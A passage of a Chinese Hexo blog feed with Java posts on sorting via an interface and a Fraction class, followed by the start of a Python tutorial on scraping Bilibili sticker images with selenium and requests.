class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ns = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">8</span>];</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ns.length; i++) &#123;</span><br><span class="line">            ns[i] = scanner.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">InsertSort</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InsertSort</span>();</span><br><span class="line">        SortedInts.newsort(ns, is);</span><br><span class="line"></span><br><span class="line">        <span class="type">BubbleSort</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BubbleSort</span>();</span><br><span class="line">        SortedInts.newsort(ns, bs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">SortMethod</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] numbers)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SortedInts</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">newsort</span><span class="params">(<span class="type">int</span>[] numbers, SortMethod s)</span> &#123;</span><br><span class="line"></span><br><span class="line">        s.sort(numbers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> n : numbers) &#123;</span><br><span class="line"></span><br><span class="line">            System.out.printf(<span class="string">&quot;%d &quot;</span>, n);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InsertSort</span> <span class="keyword">implements</span> <span class="title class_">SortMethod</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] a)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">key</span> <span class="operator">=</span> a[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; a[j] &gt; key) &#123;</span><br><span class="line">                a[j + <span class="number">1</span>] = a[j];</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            a[j + <span class="number">1</span>] = key;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BubbleSort</span> <span class="keyword">implements</span> <span class="title class_">SortMethod</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] a)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; a.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (a[j] &gt; a[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> temp;</span><br><span class="line">                    temp = a[j];</span><br><span class="line">                    a[j] = a[j + <span class="number">1</span>];</span><br><span class="line">                    a[j + <span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 实现分数的相加相乘化简</title>
      <link href="/2022/05/27/b5acf6b71caa-q1jun/"/>
      <url>/2022/05/27/b5acf6b71caa-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-实现分数的相加相乘化简"><a href="#Java-实现分数的相加相乘化简" class="headerlink" title="Java 实现分数的相加相乘化简"></a>Java 实现分数的相加相乘化简</h1><h2 id="0x01-要求："><a href="#0x01-要求：" class="headerlink" title="0x01 要求："></a>0x01 要求：</h2><p>设计一个表示分数的类Fraction。这个类用两个int类型的变量分别表示分子和分母。这个类的构造方法是：</p><p><code>Fraction(int a, int b)</code>    构造一个a&#x2F;b的分数。</p><p>这个类要提供以下的功能：</p><p><code>double toDouble(); </code>   将分数转换为double</p><p><code>Fraction plus(Fraction r);</code></p><p>将自身和r的分数相加，产生一个新的Fraction的对象。注意小学五年级学过两个分数如何相加。</p><p><code>Fraction multiply(Fraction r);</code></p><p>将自身和r的分数相乘，产生一个新的Fraction的对象。</p><p><code>void print();</code></p><p>将自身以“分子&#x2F;分母”的形式输出到标准输出，并带有回车换行。</p><blockquote><p>需要考虑以下情况：</p><p>当分母为0时，显示“错误，分母不能为0”。</p><p>当分子为0时，显示0</p><p>当分母为1时，直接显示分子</p><p>分数为负数时，负号显示在最前面</p><p>分数显示为最简形式。如2&#x2F;4应该被约分为1&#x2F;2。</p></blockquote><p>类 Fraction 中可以用以下方法进行约分和调整负号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">yuefen</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">aa</span> <span class="operator">=</span> (<span class="type">int</span>) Math.abs(a);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ab</span> <span class="operator">=</span> (<span class="type">int</span>) Math.abs(b);</span><br><span class="line">        <span class="keyword">if</span> (a * b &gt;= <span class="number">0</span>) &#123;    <span class="comment">// 调整负号</span></span><br><span class="line">            a = aa;</span><br><span class="line">            b = ab;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            a = -aa;</span><br><span class="line">            b = ab;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ((aa &lt; ab) ? aa : ab); i &gt; <span class="number">1</span>; i--) &#123;    <span class="comment">// 求最大公因数，并约分</span></span><br><span class="line">            <span class="keyword">if</span> (a % i == <span class="number">0</span> &amp;&amp; b % i == <span class="number">0</span>) &#123;</span><br><span class="line">                a /= i;</span><br><span class="line">                b /= i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>完成Fraction类定义后，使用以下main函数（请勿修改）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">         <span class="type">Fraction</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(in.nextInt(), in.nextInt());</span><br><span class="line">         <span class="type">Fraction</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(in.nextInt(),in.nextInt());</span><br><span class="line">         a.print();</span><br><span class="line">         b.print();</span><br><span class="line">         a.plus(b).print();</span><br><span class="line">         a.multiply(b).plus(<span class="keyword">new</span> <span class="title class_">Fraction</span>(<span class="number">5</span>,<span class="number">6</span>)).print();</span><br><span class="line">         a.print();</span><br><span class="line">         b.print();</span><br><span class="line">         in.close();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意，你的类的定义应该这样开始：</p><p>class Fraction {</p><p>也就是说，在你的类的class前面不要有public。</p><p>输入格式：程序运行时会输入4个数字，分别构成两个分数，依次是分子和分母。</p><p>输出格式：输出由上面的 main 函数完成，不需要额外编写代码。</p><p>输入样例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 4 1 3</span><br></pre></td></tr></table></figure><p>输出样例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1/2</span><br><span class="line"></span><br><span class="line">1/3</span><br><span class="line"></span><br><span class="line">5/6</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">1/2</span><br><span class="line"></span><br><span class="line">1/3</span><br></pre></td></tr></table></figure><h2 id="0x02-代码："><a href="#0x02-代码：" class="headerlink" title="0x02 代码："></a>0x02 代码：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fraction</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> a; <span class="comment">//分子</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> b; <span class="comment">//分母</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fraction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = a;</span><br><span class="line">        <span class="built_in">this</span>.b = b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fraction</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == b &amp;&amp; a !=<span class="number">0</span>)&#123; <span class="comment">//分子等于分母</span></span><br><span class="line">            System.out.println(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="number">1</span>)&#123; <span class="comment">//分子等于1</span></span><br><span class="line">            System.out.println(a);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="number">0</span>)&#123; <span class="comment">//分子为0</span></span><br><span class="line">            System.out.println(<span class="string">&quot;错误，分母不能为0&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.yueFen();</span><br><span class="line">        System.out.println(a+<span class="string">&quot;/&quot;</span>+b); <span class="comment">//正常输出分数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">toDouble</span><span class="params">()</span>&#123; <span class="comment">//转换分数为double</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="type">double</span>) a/(<span class="type">double</span>) b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Fraction <span class="title function_">plus</span><span class="params">(Fraction fraction)</span> &#123; <span class="comment">//分数相加</span></span><br><span class="line">        <span class="type">Fraction</span> <span class="variable">fraction1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(); <span class="comment">//需要返回的结果 2/4+6/5 = [(2*5)+(6*4)]/20</span></span><br><span class="line">        fraction1.b = <span class="built_in">this</span>.b * fraction.b; <span class="comment">// 4*5 = 20</span></span><br><span class="line">        fraction1.b = fraction1.b/GCD(<span class="built_in">this</span>.b, fraction.b);  <span class="comment">//GCD = 1</span></span><br><span class="line"><span class="comment">//        System.out.println(this.a +&quot; &quot;+this.b+&quot; &quot; + fraction.a+&quot; &quot; + fraction.b);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;gcd=&quot;+GCD(this.b, fraction.b));</span></span><br><span class="line">        fraction1.a = ((<span class="built_in">this</span>.a* fraction.b)+(fraction.a*<span class="built_in">this</span>.b))/GCD(<span class="built_in">this</span>.b, fraction.b);</span><br><span class="line"><span class="comment">//        System.out.println(&quot;fraction1.a=&quot;+fraction1.a);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;fraction1.b=&quot;+fraction1.b);</span></span><br><span class="line">        <span class="keyword">return</span> fraction1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Fraction <span class="title function_">multiply</span><span class="params">(Fraction fraction)</span> &#123; <span class="comment">//分数相乘</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>((<span class="built_in">this</span>.a* fraction.a),(<span class="built_in">this</span>.b* fraction.b));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">GCD</span> <span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> a&lt;b?a:b;</span><br><span class="line">        <span class="type">int</span> <span class="variable">gcd</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> min;i &gt;= <span class="number">1</span>;i --) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a%i == <span class="number">0</span> &amp;&amp; b%i == <span class="number">0</span>) &#123;</span><br><span class="line">                gcd = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> gcd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">yueFen</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">aa</span> <span class="operator">=</span> (<span class="type">int</span>) Math.abs(a);</span><br><span class="line">        <span class="type">int</span> <span class="variable">bb</span> <span class="operator">=</span> (<span class="type">int</span>) Math.abs(b);</span><br><span class="line">        <span class="keyword">if</span> (a*b &gt;=<span class="number">0</span>)&#123; <span class="comment">//调整负号到分子</span></span><br><span class="line">            a = aa;</span><br><span class="line">            b = bb;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            a = -aa;</span><br><span class="line">            b = bb;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (Math.min(aa, bb)); i &gt;<span class="number">1</span> ; i--)&#123; <span class="comment">//求最大公因数，约分</span></span><br><span class="line">            <span class="keyword">if</span>(a % i ==<span class="number">0</span>&amp;&amp;b%i==<span class="number">0</span>)&#123;</span><br><span class="line">                a/=i;</span><br><span class="line">                b/=i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">Fraction</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(in.nextInt(),in.nextInt());</span><br><span class="line">        <span class="type">Fraction</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(in.nextInt(),in.nextInt());</span><br><span class="line">        a.print();</span><br><span class="line">        b.print();</span><br><span class="line">        a.plus(b).print();</span><br><span class="line">        a.multiply(b).plus(<span class="keyword">new</span> <span class="title class_">Fraction</span>(<span class="number">5</span>,<span class="number">6</span>)).print();</span><br><span class="line">        a.print();</span><br><span class="line">        b.print();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何用Python爬取B站可爱的表情包</title>
      <link href="/2022/05/17/96ea04ad9183-q1jun/"/>
      <url>/2022/05/17/96ea04ad9183-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="如何用Python爬取B站可爱的表情包"><a href="#如何用Python爬取B站可爱的表情包" class="headerlink" title="如何用Python爬取B站可爱的表情包"></a>如何用Python爬取B站可爱的表情包</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近在逛B站的时候发现了一套我寻找已久的<strong>猫人表情包</strong>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/QQ20220517-090317-HD.gif" alt="QQ20220517-090317-HD"></p><p>但是当我点进去之后，看到了灰色的下载按钮<del>逐渐起了杀心</del></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220517090548240.png" alt="image-20220517090548240"></p><p>简单来说，就是不让你下载，只能下载这个<code>必剪</code>APP才能使用，无奈这个剪辑软件并不适配MacOS系统！可恶</p><p>但是这并不影响我下载，只要按下正义的<kbd>F12</kbd>，选择元素，找到链接，然后右键保存：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220517091128168.png" alt="image-20220517091128168"></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220517091150031.png" alt="image-20220517091150031"></p><p>点击这个<code>直接链接</code>之后右键就能下载到本地：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220517091316618.png" alt="image-20220517091316618"></p><p><strong>But！</strong>，这样虽然可以下载了，但是每个表情都要点进去按<kbd>F12</kbd>，一共有228张表情，岂不是要重复228次？</p><p>那我们只好写一个<del>正义的</del>爬虫来帮我下载了。</p><h2 id="0x02-思路1"><a href="#0x02-思路1" class="headerlink" title="0x02 思路1"></a>0x02 思路1</h2><p>由于这个网站是动态加载的，我们需要做更多的操作。</p><p>利用<code>selenium</code>和<code>BeautifulSoup4</code>来模拟浏览器操作，获取该页面所有我们需要的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys <span class="comment">#模仿键盘,操作下拉框的</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup    <span class="comment">#解析html的</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver    <span class="comment">#模仿浏览器的</span></span><br></pre></td></tr></table></figure><p>我使用的是<code>Chrome</code>浏览器，需要去下载<code>selenium</code>所需要的对应的浏览器驱动，下载地址如下:<br><a target="_blank" rel="noopener" href="https://chromedriver.chromium.org/downloads">https://chromedriver.chromium.org/downloads</a></p><p>我使用的Chrome版本是101，所以点击如下图所示的地方进入下载：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220517092500840.png" alt="image-20220517092500840"></p><blockquote><p>如果驱动报错就要看报错信息，这里我就是因为版本不兼容报错的，所以我格外说一下😢</p></blockquote><p>具体实现代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys <span class="comment">#模仿键盘,操作下拉框的</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup    <span class="comment">#解析html的</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver    <span class="comment">#模仿浏览器的</span></span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(executable_path=<span class="string">&quot;/Users/q1jun/chromedriver&quot;</span>)</span><br><span class="line">driver.get(<span class="string">&#x27;https://cool.bilibili.com/x/co-create/user/material_list?ps=15&amp;pn=1&amp;mid=1445996044&amp;up_from=1&amp;biz_from=3&amp;material_type=7&amp;t=1652707801269&#x27;</span>)</span><br><span class="line">driver.maximize_window() <span class="comment">#最大化页面</span></span><br><span class="line"><span class="comment">#把下拉条往下拉..</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">&#x27;//input[@class=&quot;readerImg&quot;]&#x27;</span>).send_keys(Keys.DOWN)</span><br><span class="line"></span><br><span class="line"><span class="comment">#driver.page_source是返回页面的内容.这里你需要解析下html.用到的是BeautifulSoup.记得倒包</span></span><br><span class="line">html = BeautifulSoup(driver.page_source)</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure><p>那么问题来了，如下图所示，<code>driver.find_element_by_xpath</code>这个函数已经被弃用了，导致最后获得的数据并不完全。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220516214249267.png" alt="image-20220516214249267"></p><p>运行结果如下：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220516214318031.png" alt="image-20220516214318031"></p><p>才这么几条数据，肯定不是我们所需要的两百多个表情包！可恶，启动<strong>Plan B</strong>!</p><h2 id="0x03-思路2"><a href="#0x03-思路2" class="headerlink" title="0x03 思路2"></a>0x03 思路2</h2><p>通过分析页面的请求网址，查看B站是如何请求数据的，我们仔模仿这个请求不就行了？理论存在，实践开始！</p><p>首先还是一个正义的<kbd>F12</kbd>，选择网络-&gt;过滤XDR</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220517093257540.png" alt="image-20220517093257540"></p><p>然后我们一直向下划，让前端页面一直发送请求啦取后台数据：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220516214516357.png" alt="image-20220516214516357"></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220516214542568.png" alt="image-20220516214542568"></p><p>可以看到我标记的两个变量<code>pn</code>和<code>t</code>，只有这两个变量是一直在变化的 (其他的固定参数可以先不用管)。</p><blockquote><p>很显然<code>pn</code>应该是PageNumber的缩写，标识请求的页数，那<code>t</code>和这串数字<code>1652708159004</code>是什么意思呢？</p></blockquote><p>如果认识时间戳的同学肯定一眼<del>钉真</del>就看出来了，这就是<code>时间戳</code>啊，可以用Python的<code>time</code>包验证一下：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220516214442786.png" alt="image-20220516214442786"></p><p>(因为不是同时加载的，所以略有不同)</p><p>知道请求参数，那就好办了，直接用<code>requests</code>获取数据打印出来，代码如下:</p><blockquote><p>这里只设置了<code>pn=2</code>，暂时处理一部分数据，如果一次取太多数据了不好分析。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">     <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">pn = <span class="number">2</span> <span class="comment">#测试只抓取一部分</span></span><br><span class="line">url = <span 